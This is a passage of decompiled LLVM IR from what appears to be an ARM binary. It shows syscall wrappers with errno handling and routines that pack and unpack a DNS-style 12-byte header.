  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_17708

dec_label_pc_17708:                               ; preds = %bb37, %dec_label_pc_176c4, %dec_label_pc_176f8
  %v3_17708 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_17708, i32* @r0, align 4
  %v0_1770c = call i32 @function_11048()
  %v3_17710 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17710, i32* @r0, align 4
  %v0_17714 = call i32 @function_11048()
  store i32 %v0_17714, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17720

dec_label_pc_1771c:                               ; preds = %dec_label_pc_174f4, %dec_label_pc_17518
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_17720

dec_label_pc_17720:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_174e0, %dec_label_pc_174c0, %dec_label_pc_17708, %dec_label_pc_1757c, %dec_label_pc_1771c
  %v0_17720 = load i32, i32* @r5, align 4
  store i32 %v0_17720, i32* %r0.global-to-local, align 4
  ret i32 %v0_17720

; uselistorder directives
  uselistorder i32 %v1_17678, { 1, 0, 2 }
  uselistorder i32 %v1_17674, { 1, 0 }
  uselistorder i32 %v0_17644, { 1, 0, 2 }
  uselistorder i32 %v2_17638, { 1, 0 }
  uselistorder i32 %v1_17538, { 2, 1, 0 }
  uselistorder i32 %v1_1752c, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_174ac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1744c, { 1, 0 }
  uselistorder i32 %v0_17440, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 17, 18, 4, 3, 5, 7, 6, 0, 9, 8, 11, 10, 12, 13, 15, 14, 16 }
  uselistorder i32 ()* @function_11048, { 21, 20, 19, 18, 17, 16, 11, 10, 9, 8, 7, 6, 5, 4, 3, 22, 32, 31, 30, 15, 14, 13, 12, 1, 0, 25, 24, 29, 28, 27, 26, 23, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_173ec, { 1, 0 }
  uselistorder label %dec_label_pc_17720, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1771c, { 1, 0 }
  uselistorder label %dec_label_pc_17708, { 2, 1, 0 }
  uselistorder label %dec_label_pc_176c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174f4, { 2, 0, 1 }
}

define i32 @function_17730(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17730:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17730 = load i32, i32* @r7, align 4
  store i32 %v3_17730, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17758, label %dec_label_pc_17748

dec_label_pc_17748:                               ; preds = %dec_label_pc_17730
  %v0_17748 = call i32 @function_d0ec()
  %v0_1774c = load i32, i32* %r7.global-to-local, align 4
  %v1_1774c = sub i32 0, %v0_1774c
  %v2_17750 = inttoptr i32 %v0_17748 to i32*
  store i32 %v1_1774c, i32* %v2_17750, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1775c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17758

dec_label_pc_17758:                               ; preds = %dec_label_pc_17730, %dec_label_pc_17748
  %v2_1775c = phi i32 [ %v3_17730, %dec_label_pc_17730 ], [ %v2_1775c.pre, %dec_label_pc_17748 ]
  %v0_17758 = phi i32 [ %arg1, %dec_label_pc_17730 ], [ -1, %dec_label_pc_17748 ]
  store i32 %v2_1775c, i32* %r7.global-to-local, align 4
  ret i32 %v0_17758

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17758, { 1, 0 }
}

define i32 @function_17768(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_17768:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17768 = load i32, i32* @r7, align 4
  store i32 %v3_17768, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17790, label %dec_label_pc_17780

dec_label_pc_17780:                               ; preds = %dec_label_pc_17768
  %v0_17780 = call i32 @function_d0ec()
  %v0_17784 = load i32, i32* %r7.global-to-local, align 4
  %v1_17784 = sub i32 0, %v0_17784
  %v2_17788 = inttoptr i32 %v0_17780 to i32*
  store i32 %v1_17784, i32* %v2_17788, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17794.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17790

dec_label_pc_17790:                               ; preds = %dec_label_pc_17768, %dec_label_pc_17780
  %v2_17794 = phi i32 [ %v3_17768, %dec_label_pc_17768 ], [ %v2_17794.pre, %dec_label_pc_17780 ]
  %v0_17790 = phi i32 [ %arg1, %dec_label_pc_17768 ], [ -1, %dec_label_pc_17780 ]
  store i32 %v2_17794, i32* @r7, align 4
  ret i32 %v0_17790

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17790, { 1, 0 }
}

define i32 @function_1779c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1779c:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_177a8 = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_177b8 = call i32 @function_17d54(i32 %v2_177a8)
  %v7_177bc = icmp eq i32 %v1_177b8, -1
  br i1 %v7_177bc, label %bb, label %dec_label_pc_177c8

bb:                                               ; preds = %dec_label_pc_1779c
  store i32 %v1_177b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17804

dec_label_pc_177c8:                               ; preds = %dec_label_pc_1779c
  %v2_177c8 = ptrtoint i32* %stack_var_-341 to i32
  store i32 %v2_177c8, i32* @r0, align 4
  %v0_177d0 = call i32 @function_f670()
  %v1_177d4 = add i32 %v0_177d0, 1
  %v1_177d8 = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_177d4, %v1_177d8
  br i1 %tmp, label %dec_label_pc_177e0, label %dec_label_pc_177f4

dec_label_pc_177e0:                               ; preds = %dec_label_pc_177c8
  %v0_177e0 = call i32 @function_d0ec()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_177ec = inttoptr i32 %v0_177e0 to i32*
  store i32 22, i32* %v2_177ec, align 4
  %v0_17804.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17804

dec_label_pc_177f4:                               ; preds = %dec_label_pc_177c8
  %v0_177f4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_177c8, i32* @r1, align 4
  %v2_177fc = inttoptr i32 %v0_177f4 to i8*
  %v3_177fc = call i32 @function_f8ec(i8* %v2_177fc, i32 %v2_177c8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %bb, %dec_label_pc_177e0, %dec_label_pc_177f4
  %v0_17804 = phi i32 [ %v1_177b8, %bb ], [ %v0_17804.pre, %dec_label_pc_177e0 ], [ 0, %dec_label_pc_177f4 ]
  ret i32 %v0_17804

; uselistorder directives
  uselistorder i32 %v2_177c8, { 1, 0, 2 }
  uselistorder i32 %v1_177b8, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_f8ec, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 11, 12 }
  uselistorder i32 22, { 1, 15, 2, 3, 16, 4, 5, 6, 7, 14, 8, 17, 9, 0, 18, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_17804, { 2, 1, 0 }
}

define i32 @function_17814(i32 %arg1) local_unnamed_addr {
dec_label_pc_17814:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17814 = load i32, i32* @r7, align 4
  store i32 %v3_17814, i32* %stack_var_-8, align 4
  %v0_17820 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17820, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17820, -4095
  br i1 %tmp, label %dec_label_pc_17840, label %dec_label_pc_17830

dec_label_pc_17830:                               ; preds = %dec_label_pc_17814
  %v0_17830 = call i32 @function_d0ec()
  %v0_17834 = load i32, i32* %r7.global-to-local, align 4
  %v1_17834 = sub i32 0, %v0_17834
  %v2_17838 = inttoptr i32 %v0_17830 to i32*
  store i32 %v1_17834, i32* %v2_17838, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17840.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17840

dec_label_pc_17840:                               ; preds = %dec_label_pc_17814, %dec_label_pc_17830
  %v1_17844 = phi i32 [ %v0_17820, %dec_label_pc_17814 ], [ -1, %dec_label_pc_17830 ]
  %v2_17840 = phi i32 [ %v3_17814, %dec_label_pc_17814 ], [ %v2_17840.pre, %dec_label_pc_17830 ]
  store i32 %v2_17840, i32* @r7, align 4
  ret i32 %v1_17844

; uselistorder directives
  uselistorder i32 %v0_17820, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17840, { 1, 0 }
}

define i32 @function_17848(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17848:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17880, label %dec_label_pc_1786c

dec_label_pc_1786c:                               ; preds = %dec_label_pc_17848
  %v0_1786c = call i32 @function_d0ec()
  %v0_17870 = load i32, i32* %r7.global-to-local, align 4
  %v1_17870 = sub i32 0, %v0_17870
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17878 = inttoptr i32 %v0_1786c to i32*
  store i32 %v1_17870, i32* %v2_17878, align 4
  br label %dec_label_pc_17890

dec_label_pc_17880:                               ; preds = %dec_label_pc_17848
  %v2_17880 = icmp eq i32 %arg1, 0
  br i1 %v2_17880, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17880
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17880, %bb
  call void @__pseudo_cond_branch(i1 %v2_17880, i32 ptrtoint (i32* @global_var_15928.716 to i32))
  br label %dec_label_pc_17890

dec_label_pc_17890:                               ; preds = %dec_label_pc_1786c, %.thread
  %v0_17890 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_17890

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17890, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_178a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_178a0:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_178e0, label %dec_label_pc_178cc

dec_label_pc_178cc:                               ; preds = %dec_label_pc_178a0
  %v0_178cc = call i32 @function_d0ec()
  %v0_178d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_178d0 = sub i32 0, %v0_178d0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_178d8 = inttoptr i32 %v0_178cc to i32*
  store i32 %v1_178d0, i32* %v2_178d8, align 4
  %v0_178e8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_178e8

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178a0
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_178e0 = icmp eq i32 %arg1, 0
  br i1 %v2_178e0, label %dec_label_pc_178f4, label %dec_label_pc_178e8

dec_label_pc_178e8:                               ; preds = %dec_label_pc_178e0, %dec_label_pc_178cc
  %v0_178e8 = phi i32 [ %arg1, %dec_label_pc_178e0 ], [ %v0_178e8.pre, %dec_label_pc_178cc ]
  br label %dec_label_pc_178f8

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178e0
  br label %dec_label_pc_178f8

dec_label_pc_178f8:                               ; preds = %dec_label_pc_178e8, %dec_label_pc_178f4
  %v1_17900 = phi i32 [ %v0_178e8, %dec_label_pc_178e8 ], [ %tmp8, %dec_label_pc_178f4 ]
  ret i32 %v1_17900

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 4, 0, 2 }
  uselistorder label %dec_label_pc_178f8, { 1, 0 }
}

define i32 @function_17910(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17910:
  %v0_17910 = load i32, i32* @r0, align 4
  %v1_17910 = load i32, i32* @r1, align 4
  %v2_17910 = inttoptr i32 %v0_17910 to i8*
  %v3_17910 = call i32 @function_14700(i8* %v2_17910, i32 %v1_17910)
  ret i32 %v3_17910

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_14700, { 1, 2, 0 }
}

define i32 @function_17920(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_17920:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_17924 = load i32, i32* @lr, align 4
  store i32 %v0_17924, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_17930 = icmp sgt i32 %arg3, 11
  br i1 %v7_17930, label %dec_label_pc_17938, label %dec_label_pc_17a04

dec_label_pc_17938:                               ; preds = %dec_label_pc_17920
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_17938 = add i32 %tmp, 1
  %v2_17938 = inttoptr i32 %v1_17938 to i8*
  %v3_17938 = load i8, i8* %v2_17938, align 1
  store i8 %v3_17938, i8* %tmp16, align 1
  %v0_17940 = load i32, i32* %ip.global-to-local, align 4
  %v1_17940 = inttoptr i32 %v0_17940 to i32*
  %v2_17940 = load i32, i32* %v1_17940, align 4
  %v1_17944 = trunc i32 %v2_17940 to i8
  %v4_17944 = add i32 %arg2, 1
  %v5_17944 = inttoptr i32 %v4_17944 to i8*
  store i8 %v1_17944, i8* %v5_17944, align 1
  %v0_17948 = load i32, i32* %ip.global-to-local, align 4
  %v1_17948 = add i32 %v0_17948, 8
  %v2_17948 = inttoptr i32 %v1_17948 to i32*
  %v3_17948 = load i32, i32* %v2_17948, align 4
  %v1_1794c = add i32 %v0_17948, 20
  %v2_1794c = inttoptr i32 %v1_1794c to i32*
  %v3_1794c = load i32, i32* %v2_1794c, align 4
  %v1_17950 = add i32 %v0_17948, 4
  %v2_17950 = inttoptr i32 %v1_17950 to i32*
  %v3_17950 = load i32, i32* %v2_17950, align 4
  %v1_17954 = add i32 %v0_17948, 12
  %v2_17954 = inttoptr i32 %v1_17954 to i32*
  %v3_17954 = load i32, i32* %v2_17954, align 4
  %v2_17958 = icmp eq i32 %v3_1794c, 0
  br i1 %v2_17958, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_17938
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_17938, %bb
  %v0_17968 = phi i32 [ 0, %dec_label_pc_17938 ], [ 1, %bb ]
  %v1_17960 = urem i32 %v3_17948, 16
  %v2_17964 = icmp eq i32 %v3_17950, 0
  %v4_17968 = mul nuw nsw i32 %v1_17960, 8
  %v5_17968 = or i32 %v0_17968, %v4_17968
  %v1_1796c = add i32 %v0_17948, 16
  %v2_1796c = inttoptr i32 %v1_1796c to i32*
  %v3_1796c = load i32, i32* %v2_1796c, align 4
  %. = select i1 %v2_17964, i32 0, i32 128
  %v2_17978 = icmp eq i32 %v3_17954, 0
  %storemerge11 = select i1 %v2_17978, i32 0, i32 4
  %v2_17984 = or i32 %v5_17968, %.
  %v2_17988 = icmp eq i32 %v3_1796c, 0
  %.26 = select i1 %v2_17988, i32 0, i32 2
  %v2_17994 = or i32 %v2_17984, %storemerge11
  %v2_17998 = or i32 %v2_17994, %.26
  %v1_1799c = trunc i32 %v2_17998 to i8
  %v2_1799c = load i32, i32* %lr.global-to-local, align 4
  %v3_1799c = add i32 %v2_1799c, 2
  %v4_1799c = inttoptr i32 %v3_1799c to i8*
  store i8 %v1_1799c, i8* %v4_1799c, align 1
  %v0_179a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_179a0 = add i32 %v0_179a0, 24
  %v1_179a4 = inttoptr i32 %v1_179a0 to i32*
  %v2_179a4 = load i32, i32* %v1_179a4, align 4
  %v3_179a4 = add i32 %v0_179a0, 28
  %v4_179a4 = inttoptr i32 %v3_179a4 to i32*
  %v5_179a4 = load i32, i32* %v4_179a4, align 4
  %v2_179a8 = icmp eq i32 %v2_179a4, 0
  %v1_179ac = urem i32 %v5_179a4, 16
  %v0_179b8 = select i1 %v2_179a8, i32 0, i32 128
  %v2_179b8 = or i32 %v1_179ac, %v0_179b8
  %v1_179bc = trunc i32 %v2_179b8 to i8
  %v2_179bc = load i32, i32* %lr.global-to-local, align 4
  %v3_179bc = add i32 %v2_179bc, 3
  %v4_179bc = inttoptr i32 %v3_179bc to i8*
  store i8 %v1_179bc, i8* %v4_179bc, align 1
  %v0_179c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_179c0 = add i32 %v0_179c0, 33
  %v2_179c0 = inttoptr i32 %v1_179c0 to i8*
  %v3_179c0 = load i8, i8* %v2_179c0, align 1
  %v2_179c4 = load i32, i32* %lr.global-to-local, align 4
  %v3_179c4 = add i32 %v2_179c4, 4
  %v4_179c4 = inttoptr i32 %v3_179c4 to i8*
  store i8 %v3_179c0, i8* %v4_179c4, align 1
  %v0_179c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_179c8 = add i32 %v0_179c8, 32
  %v2_179c8 = inttoptr i32 %v1_179c8 to i32*
  %v3_179c8 = load i32, i32* %v2_179c8, align 4
  %v1_179cc = trunc i32 %v3_179c8 to i8
  %v2_179cc = load i32, i32* %lr.global-to-local, align 4
  %v3_179cc = add i32 %v2_179cc, 5
  %v4_179cc = inttoptr i32 %v3_179cc to i8*
  store i8 %v1_179cc, i8* %v4_179cc, align 1
  %v0_179d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_179d0 = add i32 %v0_179d0, 37
  %v2_179d0 = inttoptr i32 %v1_179d0 to i8*
  %v3_179d0 = load i8, i8* %v2_179d0, align 1
  %v2_179d4 = load i32, i32* %lr.global-to-local, align 4
  %v3_179d4 = add i32 %v2_179d4, 6
  %v4_179d4 = inttoptr i32 %v3_179d4 to i8*
  store i8 %v3_179d0, i8* %v4_179d4, align 1
  %v0_179d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_179d8 = add i32 %v0_179d8, 36
  %v2_179d8 = inttoptr i32 %v1_179d8 to i32*
  %v3_179d8 = load i32, i32* %v2_179d8, align 4
  %v1_179dc = trunc i32 %v3_179d8 to i8
  %v2_179dc = load i32, i32* %lr.global-to-local, align 4
  %v3_179dc = add i32 %v2_179dc, 7
  %v4_179dc = inttoptr i32 %v3_179dc to i8*
  store i8 %v1_179dc, i8* %v4_179dc, align 1
  %v0_179e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_179e0 = add i32 %v0_179e0, 41
  %v2_179e0 = inttoptr i32 %v1_179e0 to i8*
  %v3_179e0 = load i8, i8* %v2_179e0, align 1
  %v2_179e4 = load i32, i32* %lr.global-to-local, align 4
  %v3_179e4 = add i32 %v2_179e4, 8
  %v4_179e4 = inttoptr i32 %v3_179e4 to i8*
  store i8 %v3_179e0, i8* %v4_179e4, align 1
  %v0_179e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_179e8 = add i32 %v0_179e8, 40
  %v2_179e8 = inttoptr i32 %v1_179e8 to i32*
  %v3_179e8 = load i32, i32* %v2_179e8, align 4
  %v1_179ec = trunc i32 %v3_179e8 to i8
  %v2_179ec = load i32, i32* %lr.global-to-local, align 4
  %v3_179ec = add i32 %v2_179ec, 9
  %v4_179ec = inttoptr i32 %v3_179ec to i8*
  store i8 %v1_179ec, i8* %v4_179ec, align 1
  %v0_179f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_179f0 = add i32 %v0_179f0, 45
  %v2_179f0 = inttoptr i32 %v1_179f0 to i8*
  %v3_179f0 = load i8, i8* %v2_179f0, align 1
  %v2_179f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_179f4 = add i32 %v2_179f4, 10
  %v4_179f4 = inttoptr i32 %v3_179f4 to i8*
  store i8 %v3_179f0, i8* %v4_179f4, align 1
  %v0_179f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_179f8 = add i32 %v0_179f8, 44
  %v2_179f8 = inttoptr i32 %v1_179f8 to i32*
  %v3_179f8 = load i32, i32* %v2_179f8, align 4
  %v1_179fc = trunc i32 %v3_179f8 to i8
  %v2_179fc = load i32, i32* %lr.global-to-local, align 4
  %v3_179fc = add i32 %v2_179fc, 11
  %v4_179fc = inttoptr i32 %v3_179fc to i8*
  store i8 %v1_179fc, i8* %v4_179fc, align 1
  %v2_17a04.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_17a04

dec_label_pc_17a04:                               ; preds = %dec_label_pc_17920, %bb17
  %v2_17a04 = phi i32 [ %v2_17a04.pre, %bb17 ], [ %v0_17924, %dec_label_pc_17920 ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %dec_label_pc_17920 ]
  store i32 %v2_17a04, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_17948, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder i32 45, { 1, 2, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17a04, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_17a0c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17a0c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_17a0c = load i8, i8* %arg1, align 1
  %v4_17a0c = zext i8 %v3_17a0c to i32
  %v2_17a10 = add i32 %tmp, 1
  %v3_17a10 = inttoptr i32 %v2_17a10 to i8*
  %v4_17a10 = load i8, i8* %v3_17a10, align 1
  %v5_17a10 = zext i8 %v4_17a10 to i32
  %v4_17a14 = mul nuw nsw i32 %v4_17a0c, 256
  %v5_17a14 = or i32 %v5_17a10, %v4_17a14
  %v2_17a18 = inttoptr i32 %arg2 to i32*
  store i32 %v5_17a14, i32* %v2_17a18, align 4
  %v2_17a1c = add i32 %tmp, 2
  %v3_17a1c = inttoptr i32 %v2_17a1c to i8*
  %v4_17a1c = load i8, i8* %v3_17a1c, align 1
  %tmp3 = icmp slt i8 %v4_17a1c, 0
  %v3_17a20 = zext i1 %tmp3 to i32
  %v2_17a24 = add i32 %arg2, 4
  %v3_17a24 = inttoptr i32 %v2_17a24 to i32*
  store i32 %v3_17a20, i32* %v3_17a24, align 4
  %v4_17a28 = load i8, i8* %v3_17a1c, align 1
  %div = udiv i8 %v4_17a28, 8
  %tmp4 = urem i8 %div, 16
  %v1_17a30 = zext i8 %tmp4 to i32
  %v2_17a34 = add i32 %arg2, 8
  %v3_17a34 = inttoptr i32 %v2_17a34 to i32*
  store i32 %v1_17a30, i32* %v3_17a34, align 4
  %v4_17a38 = load i8, i8* %v3_17a1c, align 1
  %div1 = udiv i8 %v4_17a38, 4
  %tmp5 = urem i8 %div1, 2
  %v1_17a40 = zext i8 %tmp5 to i32
  %v2_17a44 = add i32 %arg2, 12
  %v3_17a44 = inttoptr i32 %v2_17a44 to i32*
  store i32 %v1_17a40, i32* %v3_17a44, align 4
  %v4_17a48 = load i8, i8* %v3_17a1c, align 1
  %div2 = udiv i8 %v4_17a48, 2
  %tmp6 = urem i8 %div2, 2
  %v1_17a50 = zext i8 %tmp6 to i32
  %v2_17a54 = add i32 %arg2, 16
  %v3_17a54 = inttoptr i32 %v2_17a54 to i32*
  store i32 %v1_17a50, i32* %v3_17a54, align 4
  %v4_17a58 = load i8, i8* %v3_17a1c, align 1
  %tmp7 = urem i8 %v4_17a58, 2
  %v1_17a5c = zext i8 %tmp7 to i32
  %v2_17a60 = add i32 %arg2, 20
  %v3_17a60 = inttoptr i32 %v2_17a60 to i32*
  store i32 %v1_17a5c, i32* %v3_17a60, align 4
  %v2_17a64 = add i32 %tmp, 3
  %v3_17a64 = inttoptr i32 %v2_17a64 to i8*
  %v4_17a64 = load i8, i8* %v3_17a64, align 1
  %tmp8 = icmp slt i8 %v4_17a64, 0
  %v3_17a68 = zext i1 %tmp8 to i32
  %v2_17a6c = add i32 %arg2, 24
  %v3_17a6c = inttoptr i32 %v2_17a6c to i32*
  store i32 %v3_17a68, i32* %v3_17a6c, align 4
  %v4_17a70 = load i8, i8* %v3_17a64, align 1
  %tmp9 = urem i8 %v4_17a70, 16
  %v1_17a74 = zext i8 %tmp9 to i32
  %v2_17a78 = add i32 %arg2, 28
  %v3_17a78 = inttoptr i32 %v2_17a78 to i32*
  store i32 %v1_17a74, i32* %v3_17a78, align 4
  %v2_17a7c = add i32 %tmp, 4
  %v3_17a7c = inttoptr i32 %v2_17a7c to i8*
  %v4_17a7c = load i8, i8* %v3_17a7c, align 1
  %v5_17a7c = zext i8 %v4_17a7c to i32
  %v2_17a80 = add i32 %tmp, 5
  %v3_17a80 = inttoptr i32 %v2_17a80 to i8*
  %v4_17a80 = load i8, i8* %v3_17a80, align 1
  %v5_17a80 = zext i8 %v4_17a80 to i32
  %v4_17a84 = mul nuw nsw i32 %v5_17a7c, 256
  %v5_17a84 = or i32 %v5_17a80, %v4_17a84
  %v2_17a88 = add i32 %arg2, 32
  %v3_17a88 = inttoptr i32 %v2_17a88 to i32*
  store i32 %v5_17a84, i32* %v3_17a88, align 4
  %v2_17a8c = add i32 %tmp, 6
  %v3_17a8c = inttoptr i32 %v2_17a8c to i8*
  %v4_17a8c = load i8, i8* %v3_17a8c, align 1
  %v5_17a8c = zext i8 %v4_17a8c to i32
  %v2_17a90 = add i32 %tmp, 7
  %v3_17a90 = inttoptr i32 %v2_17a90 to i8*
  %v4_17a90 = load i8, i8* %v3_17a90, align 1
  %v5_17a90 = zext i8 %v4_17a90 to i32
  %v4_17a94 = mul nuw nsw i32 %v5_17a8c, 256
  %v5_17a94 = or i32 %v5_17a90, %v4_17a94
  %v2_17a98 = add i32 %arg2, 36
  %v3_17a98 = inttoptr i32 %v2_17a98 to i32*
  store i32 %v5_17a94, i32* %v3_17a98, align 4
  %v2_17a9c = add i32 %tmp, 8
  %v3_17a9c = inttoptr i32 %v2_17a9c to i8*
  %v4_17a9c = load i8, i8* %v3_17a9c, align 1
  %v5_17a9c = zext i8 %v4_17a9c to i32
  %v2_17aa0 = add i32 %tmp, 9
  %v3_17aa0 = inttoptr i32 %v2_17aa0 to i8*
  %v4_17aa0 = load i8, i8* %v3_17aa0, align 1
  %v5_17aa0 = zext i8 %v4_17aa0 to i32
  %v4_17aa4 = mul nuw nsw i32 %v5_17a9c, 256
  %v5_17aa4 = or i32 %v5_17aa0, %v4_17aa4
  %v2_17aa8 = add i32 %arg2, 40
  %v3_17aa8 = inttoptr i32 %v2_17aa8 to i32*
  store i32 %v5_17aa4, i32* %v3_17aa8, align 4
  %v2_17aac = add i32 %tmp, 11
  %v3_17aac = inttoptr i32 %v2_17aac to i8*
  %v4_17aac = load i8, i8* %v3_17aac, align 1
  %v5_17aac = zext i8 %v4_17aac to i32
  %v2_17ab0 = add i32 %tmp, 10
  %v3_17ab0 = inttoptr i32 %v2_17ab0 to i8*
  %v4_17ab0 = load i8, i8* %v3_17ab0, align 1
  %v5_17ab0 = zext i8 %v4_17ab0 to i32
  %v4_17ab4 = mul nuw nsw i32 %v5_17ab0, 256
  %v5_17ab4 = or i32 %v4_17ab4, %v5_17aac
  %v2_17ab8 = add i32 %arg2, 44
  %v3_17ab8 = inttoptr i32 %v2_17ab8 to i32*
  store i32 %v5_17ab4, i32* %v3_17ab8, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 2, 3, 7, 8, 4, 29, 0, 1, 12, 13, 14, 15, 16, 17, 9, 10, 11, 5, 6, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 11, { 10, 11, 4, 5, 7, 8, 9, 12, 20, 13, 1, 2, 3, 14, 15, 16, 17, 18, 19, 0, 6 }
